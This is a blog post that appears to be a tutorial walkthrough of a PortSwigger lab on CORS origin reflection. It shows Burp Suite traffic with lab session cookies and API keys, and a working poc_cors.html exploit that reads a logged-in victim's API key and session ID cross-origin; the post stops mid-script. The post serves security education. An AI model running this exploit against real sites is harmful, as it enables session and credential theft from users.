<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

 


      <title>Exploiting CORS vulnerability with basic origin reflection - </title>

  <meta name="description" content="Exploiting CORS Misconfigurations Introduction During a recent security assessment, I discovered a CORS (Cross-Origin Resource Sharing) misconfiguration that allowed complete bypass of the Same-Origin Policy. This vulnerability enabled an attacker to steal sensitive user information including API keys, email addresses, and session tokens from authenticated users.
In this guide, I&rsquo;ll walk you through the complete exploitation process using PortSwigger&rsquo;s Web Security Academy lab as a practical example.
Lab: CORS vulnerability with basic origin reflection">
  <meta name="author" content="Alessandro Bresciani"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "Blog",
    
    "url": "https:\/\/cyberroute.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/cyberroute.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/cyberroute.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/cyberroute.github.io\/post\/2025-10-14-cors\/",
          "name": "Exploiting cors vulnerability with basic origin reflection"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : "Alessandro Bresciani"
  },
  "headline": "Exploiting CORS vulnerability with basic origin reflection",
  "description" : "Exploiting CORS Misconfigurations Introduction During a recent security assessment, I discovered a CORS (Cross-Origin Resource Sharing) misconfiguration that allowed complete bypass of the Same-Origin Policy. This vulnerability enabled an attacker to steal sensitive user information including API keys, email addresses, and session tokens from authenticated users.\nIn this guide, I\u0026rsquo;ll walk you through the complete exploitation process using PortSwigger\u0026rsquo;s Web Security Academy lab as a practical example.\nLab: CORS vulnerability with basic origin reflection",
  "inLanguage" : "en",
  "wordCount":  1493 ,
  "datePublished" : "2025-10-14T10:10:31",
  "dateModified" : "2025-10-14T10:10:31",
  "image" : "https:\/\/cyberroute.github.io\/img\/avatar-icon.png",
  "keywords" : [ "" ],
  "mainEntityOfPage" : "https:\/\/cyberroute.github.io\/post\/2025-10-14-cors\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/cyberroute.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/cyberroute.github.io\/img\/avatar-icon.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>

<meta property="og:title" content="Exploiting CORS vulnerability with basic origin reflection" />
<meta property="og:description" content="Exploiting CORS Misconfigurations Introduction During a recent security assessment, I discovered a CORS (Cross-Origin Resource Sharing) misconfiguration that allowed complete bypass of the Same-Origin Policy. This vulnerability enabled an attacker to steal sensitive user information including API keys, email addresses, and session tokens from authenticated users.
In this guide, I&rsquo;ll walk you through the complete exploitation process using PortSwigger&rsquo;s Web Security Academy lab as a practical example.
Lab: CORS vulnerability with basic origin reflection">
<meta property="og:image" content="https://cyberroute.github.io/img/avatar-icon.png" />
<meta property="og:url" content="https://cyberroute.github.io/post/2025-10-14-cors/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="Blog" />

  <meta name="twitter:title" content="Exploiting CORS vulnerability with basic origin reflection" />
  <meta name="twitter:description" content="Exploiting CORS Misconfigurations Introduction During a recent security assessment, I discovered a CORS (Cross-Origin Resource Sharing) misconfiguration that allowed complete bypass of the Same-Origin …">
  <meta name="twitter:image" content="https://cyberroute.github.io/img/avatar-icon.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://cyberroute.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.123.7">
  <link rel="alternate" href="https://cyberroute.github.io/index.xml" type="application/rss+xml" title="Blog"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.css" integrity="sha384-3UiQGuEI4TTMaFmGIZumfRPtfKQ3trwQE2JgosJxCnGmQpL/lJdjpcHkaaFwHlcI" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous"><link rel="stylesheet" href="https://cyberroute.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://cyberroute.github.io/css/syntax.css" /><link rel="stylesheet" href="https://cyberroute.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">

  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://cyberroute.github.io/">Blog</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Blog" href="/">Blog</a>
            </li>
          
        
          
            <li class="navlinks-container">
              <a class="navlinks-parent">Projects</a>
              <div class="navlinks-children">
                
                  <a href="/post/2024-02-25-scanme">Scanme</a>
                
                  <a href="/post/2024-03-11-bruter">Bruter</a>
                
              </div>
            </li>
          
        
          
            <li>
              <a title="About" href="/page/about/">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="Blog" href="https://cyberroute.github.io/">
            <img class="avatar-img" src="https://cyberroute.github.io/img/avatar-icon.png" alt="Blog" />
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  
    <div id="header-big-imgs" data-num-img=3
      
         
          data-img-src-1="/img/triangle.jpg"
         
         
      
         
          data-img-src-2="/img/sphere.jpg"
         
         
      
         
          data-img-src-3="/img/hexagon.jpg"
         
         
      ></div>
  

  <header class="header-section has-img">
    
      
      <div class="intro-header big-img" style="background-image: url('/img/triangle.jpg');">
        
        <div class="container">
          <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
              <div class="post-heading">
                <h1>Exploiting CORS vulnerability with basic origin reflection</h1>
                  
                  
                    <span class="post-meta">
  
  
  <i class="fas fa-calendar"></i>&nbsp;Posted on October 14, 2025
  
  
  
  
    
      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;Alessandro Bresciani
    
  
  
</span>


                  
              </div>
            </div>
          </div>
        </div>
        <span class="img-desc" style="display: inline;"></span>
      </div>
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="post-heading">
              
                <h1>Exploiting CORS vulnerability with basic origin reflection</h1>
              
              
              
              
                <span class="post-meta">
  
  
  <i class="fas fa-calendar"></i>&nbsp;Posted on October 14, 2025
  
  
  
  
    
      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;Alessandro Bresciani
    
  
  
</span>


              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <h1 id="exploiting-cors-misconfigurations">Exploiting CORS Misconfigurations</h1>
<h2 id="introduction">Introduction</h2>
<p>During a recent security assessment, I discovered a CORS (Cross-Origin Resource Sharing) misconfiguration that allowed complete bypass of the Same-Origin Policy. This vulnerability enabled an attacker to steal sensitive user information including API keys, email addresses, and session tokens from authenticated users.</p>
<p>In this guide, I&rsquo;ll walk you through the complete exploitation process using PortSwigger&rsquo;s Web Security Academy lab as a practical example.</p>
<p><strong>Lab:</strong> <a href="https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack">CORS vulnerability with basic origin reflection</a></p>
<hr>
<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li><a href="#understanding-cors">Understanding CORS</a></li>
<li><a href="#discovery-with-burp-suite">Discovery with Burp Suite</a></li>
<li><a href="#identifying-the-vulnerability">Identifying the Vulnerability</a></li>
<li><a href="#building-the-exploit">Building the Exploit</a></li>
<li><a href="#testing">Testing</a></li>
</ol>
<hr>
<h2 id="understanding-cors">Understanding CORS</h2>
<h3 id="what-is-cors">What is CORS?</h3>
<p>Cross-Origin Resource Sharing (CORS) is a browser security mechanism that controls how web pages from one origin can access resources from another origin. By default, browsers enforce the <strong>Same-Origin Policy (SOP)</strong>, which blocks cross-origin requests.</p>
<p><strong>Example scenario:</strong>
Website A: <a href="https://legitimate-site.com">https://legitimate-site.com</a>
Website B: <a href="https://attacker-site.com">https://attacker-site.com</a>
Without CORS, if a user visits Website B, JavaScript on that page
cannot read data from Website A (blocked by Same-Origin Policy).
With CORS misconfiguration, Website B can bypass this protection.</p>
<h3 id="how-cors-works">How CORS Works</h3>
<p>When JavaScript makes a cross-origin request:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://api.example.com/user/data&#39;</span>, {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;include&#39;</span>  <span style="color:#75715e">// Send cookies
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>})
</span></span></code></pre></div><p>The server responds with:</p>
<pre tabindex="0"><code>HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://trusted-site.com
Access-Control-Allow-Credentials: true
</code></pre><p>The browser checks:</p>
<p>Does Access-Control-Allow-Origin match the requesting origin? If yes, allow JavaScript to read the response If no, block access</p>
<h3 id="the-vulnerability">The Vulnerability</h3>
<p>A CORS misconfiguration occurs when the server dynamically reflects the Origin header:</p>
<pre tabindex="0"><code>Request:
  Origin: https://evil.com

Response:
  Access-Control-Allow-Origin: https://evil.com           ← REFLECTED!
  Access-Control-Allow-Credentials: true                  ← ALLOWS COOKIES!
</code></pre><p>This combination is critical because:</p>
<ol>
<li>Any origin becomes &ldquo;trusted&rdquo;</li>
<li>Authenticated requests are possible (cookies sent)</li>
<li>Private data can be read by attacker&rsquo;s JavaScript</li>
</ol>
<h2 id="discovery-with-burp-suite">Discovery with Burp Suite</h2>
<p>For this walkthrough, I&rsquo;ll use PortSwigger&rsquo;s Web Security Academy <a href="https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack">https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack</a> - as the lab only request to upload the PoC onto their server I have decided to dig deeper to understand better the exploitation mechanism behind it. And I proved that this worked also on ngrok instances.</p>
<h3 id="step-1-configure-burp-suite">Step 1: Configure Burp Suite</h3>
<p>Start Burp Suite and ensure Proxy is listening on 127.0.0.1:8080
Configure your browser to use Burp as proxy
Turn off Intercept (Proxy → Intercept → Intercept is off)</p>
<h3 id="step-2-capture-normal-traffic">Step 2: Capture Normal Traffic</h3>
<p>Navigate to the lab and click &ldquo;My account&rdquo; Log in with the provided credentials Access your account page - you should see your API key displayed
Switch to Burp Suite → Proxy → HTTP history</p>
<h3 id="step-3-identify-the-api-endpoint">Step 3: Identify the API Endpoint</h3>
<p>Look through the HTTP history for AJAX requests. You&rsquo;ll find:</p>
<pre tabindex="0"><code>ET /accountDetails HTTP/2
Host: 0a9100ff03dc089a80b21c1000c600d7.web-security-academy.net
Cookie: session=WRBRHjZi4XECoH7sK8975BtpftkGyU3u
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: */*
Accept-Language: en-US,en;q=0.5
</code></pre><p>Response:</p>
<pre tabindex="0"><code>HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8

{
  &#34;username&#34;: &#34;wiener&#34;,
  &#34;email&#34;: &#34;&#34;,
  &#34;apikey&#34;: &#34;jwgIRSHi8lyHdGx2IpEL0ObfpUJXsYPY&#34;,
  &#34;sessions&#34;: [
    &#34;WRBRHjZi4XECoH7sK8975BtpftkGyU3u&#34;
  ]
}
</code></pre><h2 id="identifying-the-vulnerability">Identifying the Vulnerability</h2>
<h3 id="step-4-send-to-repeater">Step 4: Send to Repeater</h3>
<ol>
<li>Right-click on the /accountDetails request</li>
<li>Select &ldquo;Send to Repeater&rdquo;</li>
<li>Navigate to the Repeater tab</li>
</ol>
<h3 id="step-5-add-origin-header">Step 5: Add Origin Header</h3>
<p>In Repeater, add an Origin header with a test domain:</p>
<p><img src="/images/burp.png" alt="alt"></p>
<pre tabindex="0"><code>GET /accountDetails HTTP/2
Host: 0a9100ff03dc089a80b21c1000c600d7.web-security-academy.net
Cookie: session=eNilmrP9HTjaCRjcZ1ClkiCDV3xlQoyk
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: https://arabinosic-edra-overplainly.ngrok-free.dev
Referer: https://arabinosic-edra-overplainly.ngrok-free.dev/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Te: trailers
</code></pre><p>Click &ldquo;Send&rdquo;</p>
<h3 id="step-6-analyze-the-response">Step 6: Analyze the Response</h3>
<pre tabindex="0"><code>HTTP/2 200 OK
Access-Control-Allow-Origin: https://arabinosic-edra-overplainly.ngrok-free.dev
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 189

{
  &#34;username&#34;: &#34;wiener&#34;,
  &#34;email&#34;: &#34;&#34;,
  &#34;apikey&#34;: &#34;jwgIRSHi8lyHdGx2IpEL0ObfpUJXsYPY&#34;,
  &#34;sessions&#34;: [
    &#34;rzTUoGayHd1jzNCFXxcol8ysy83pL0c9&#34;,
    &#34;eNilmrP9HTjaCRjcZ1ClkiCDV3xlQoyk&#34;
  ]
}
</code></pre><p>The vulnerability is confirmed!!!</p>
<h2 id="building-the-exploit">Building the exploit!</h2>
<h3 id="understanding-the-attack-flow">Understanding the Attack Flow</h3>
<ol>
<li>Victim is logged into target.web-security-academy.net
↓</li>
<li>Victim visits attacker&rsquo;s website (evil-site.com)
↓</li>
<li>Attacker&rsquo;s JavaScript executes in victim&rsquo;s browser
↓</li>
<li>JavaScript makes request to target.web-security-academy.net
↓</li>
<li>Browser automatically sends victim&rsquo;s session cookie
↓</li>
<li>Server returns victim&rsquo;s private data + CORS headers
↓</li>
<li>Attacker&rsquo;s JavaScript reads the response (CORS allows it)
↓</li>
<li>Data is exfiltrated to attacker&rsquo;s server
↓</li>
<li>Attacker has stolen: API key, session, email, etc.</li>
</ol>
<h3 id="step-7-create-basic-exploit">Step 7: Create basic exploit</h3>
<p>Create a file poc_cors.html</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
</span></span><span style="display:flex;"><span>&lt;html&gt;
</span></span><span style="display:flex;"><span>&lt;head&gt;
</span></span><span style="display:flex;"><span>    &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;title&gt;CORS Exploit - PortSwigger Lab&lt;/title&gt;
</span></span><span style="display:flex;"><span>    &lt;style&gt;
</span></span><span style="display:flex;"><span>        body <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            font-family: Arial, sans-serif;
</span></span><span style="display:flex;"><span>            max-width: 900px;
</span></span><span style="display:flex;"><span>            margin: 50px auto;
</span></span><span style="display:flex;"><span>            padding: 20px;
</span></span><span style="display:flex;"><span>            background: <span style="color:#75715e">#f5f5f5;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        .container <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            background: white;
</span></span><span style="display:flex;"><span>            padding: 30px;
</span></span><span style="display:flex;"><span>            border-radius: 10px;
</span></span><span style="display:flex;"><span>            box-shadow: <span style="color:#ae81ff">0</span> 2px 10px rgba<span style="color:#f92672">(</span>0,0,0,0.1<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        h1 <span style="color:#f92672">{</span> color: <span style="color:#75715e">#d9534f; }</span>
</span></span><span style="display:flex;"><span>        .status <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            font-size: 20px;
</span></span><span style="display:flex;"><span>            font-weight: bold;
</span></span><span style="display:flex;"><span>            margin: 20px 0;
</span></span><span style="display:flex;"><span>            padding: 15px;
</span></span><span style="display:flex;"><span>            border-radius: 5px;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        .success <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            background: <span style="color:#75715e">#dff0d8;</span>
</span></span><span style="display:flex;"><span>            color: <span style="color:#75715e">#3c763d;</span>
</span></span><span style="display:flex;"><span>            border: 1px solid <span style="color:#75715e">#d6e9c6;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        .error <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            background: <span style="color:#75715e">#f2dede;</span>
</span></span><span style="display:flex;"><span>            color: <span style="color:#75715e">#a94442;</span>
</span></span><span style="display:flex;"><span>            border: 1px solid <span style="color:#75715e">#ebccd1;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        .loading <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            background: <span style="color:#75715e">#d9edf7;</span>
</span></span><span style="display:flex;"><span>            color: <span style="color:#75715e">#31708f;</span>
</span></span><span style="display:flex;"><span>            border: 1px solid <span style="color:#75715e">#bce8f1;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        pre <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            background: <span style="color:#75715e">#2d2d2d;</span>
</span></span><span style="display:flex;"><span>            color: <span style="color:#75715e">#f8f8f2;</span>
</span></span><span style="display:flex;"><span>            padding: 20px;
</span></span><span style="display:flex;"><span>            border-radius: 5px;
</span></span><span style="display:flex;"><span>            overflow: auto;
</span></span><span style="display:flex;"><span>            font-size: 14px;
</span></span><span style="display:flex;"><span>            line-height: 1.6;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        .highlight <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            background: <span style="color:#75715e">#fff3cd;</span>
</span></span><span style="display:flex;"><span>            padding: 15px;
</span></span><span style="display:flex;"><span>            border-left: 4px solid <span style="color:#75715e">#ffc107;</span>
</span></span><span style="display:flex;"><span>            margin: 20px 0;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    &lt;/style&gt;
</span></span><span style="display:flex;"><span>&lt;/head&gt;
</span></span><span style="display:flex;"><span>&lt;body&gt;
</span></span><span style="display:flex;"><span>    &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;h1&gt;🔓 CORS Vulnerability PoC&lt;/h1&gt;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        &lt;div id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;status&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;status loading&#34;</span>&gt;
</span></span><span style="display:flex;"><span>            ⏳ Sending malicious cross-origin request...
</span></span><span style="display:flex;"><span>        &lt;/div&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;highlight&#34;</span>&gt;
</span></span><span style="display:flex;"><span>            &lt;strong&gt;Attack Details:&lt;/strong&gt;&lt;br&gt;
</span></span><span style="display:flex;"><span>            &lt;strong&gt;Attacker Origin:&lt;/strong&gt; &lt;span id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;origin&#34;</span>&gt;&lt;/span&gt;&lt;br&gt;
</span></span><span style="display:flex;"><span>            &lt;strong&gt;Target:&lt;/strong&gt; https://0a9100ff03dc089a80b21c1000c600d7.web-security-academy.net/accountDetails&lt;br&gt;
</span></span><span style="display:flex;"><span>            &lt;strong&gt;Method:&lt;/strong&gt; Authenticated cross-origin GET request
</span></span><span style="display:flex;"><span>        &lt;/div&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        &lt;h2&gt;📦 Stolen Data:&lt;/h2&gt;
</span></span><span style="display:flex;"><span>        &lt;pre id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;result&#34;</span>&gt;Waiting <span style="color:#66d9ef">for</span> response...&lt;/pre&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        &lt;h2&gt;🔍 Proof of Exploitation:&lt;/h2&gt;
</span></span><span style="display:flex;"><span>        &lt;pre id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;proof&#34;</span>&gt;Checking CORS headers...&lt;/pre&gt;
</span></span><span style="display:flex;"><span>    &lt;/div&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    &lt;script&gt;
</span></span><span style="display:flex;"><span>        // Display attacker<span style="color:#e6db74">&#39;s origin
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        document.getElementById(&#39;</span>origin<span style="color:#e6db74">&#39;).textContent = window.location.origin;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        console.log(&#34;🎯 CORS Exploit Started&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        console.log(&#34;Attacker Origin:&#34;, window.location.origin);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        var req = new XMLHttpRequest();
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        req.onreadystatechange = function() {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            if (req.readyState === XMLHttpRequest.DONE) {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                console.log(&#34;📡 Response received. Status:&#34;, req.status);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                if (req.status === 200) {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    // SUCCESS!
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>status<span style="color:#e6db74">&#39;).className = &#39;</span>status success<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>status<span style="color:#e6db74">&#39;).innerHTML = 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>✅ &lt;strong&gt;EXPLOIT SUCCESSFUL!&lt;/strong&gt; CORS misconfiguration exploited.<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    try {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        var data = JSON.parse(req.responseText);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        // Display stolen data prominently
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        document.getElementById(&#39;</span>result<span style="color:#e6db74">&#39;).innerHTML = 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>&lt;strong style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;color: #d9534f;&#34;</span>&gt;🚨 SENSITIVE DATA STOLEN VIA CORS VULNERABILITY:&lt;/strong&gt;<span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>🔑 &lt;strong&gt;API Key:&lt;/strong&gt; <span style="color:#e6db74">&#39; + data.apikey + &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>👤 &lt;strong&gt;Username:&lt;/strong&gt; <span style="color:#e6db74">&#39; + data.username + &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>📧 &lt;strong&gt;Email:&lt;/strong&gt; <span style="color:#e6db74">&#39; + (data.email || &#39;</span><span style="color:#f92672">(</span>empty<span style="color:#f92672">)</span><span style="color:#e6db74">&#39;) + &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>🍪 &lt;strong&gt;Session ID:&lt;/strong&gt; <span style="color:#e6db74">&#39; + data.sessions[0] + &#39;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>&lt;strong&gt;Full JSON Response:&lt;/strong&gt;<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            JSON.stringify(data, null, 2);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        // Show proof of CORS misconfiguration
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        document.getElementById(&#39;</span>proof<span style="color:#e6db74">&#39;).innerHTML = 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>&lt;strong style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;color: #5cb85c;&#34;</span>&gt;✅ CORS Misconfiguration Confirmed:&lt;/strong&gt;<span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>The server responded with:<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>• Status: <span style="color:#ae81ff">200</span> OK<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>• Access-Control-Allow-Origin: <span style="color:#e6db74">&#39; + window.location.origin + &#39;</span> <span style="color:#f92672">(</span>reflected!<span style="color:#f92672">)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
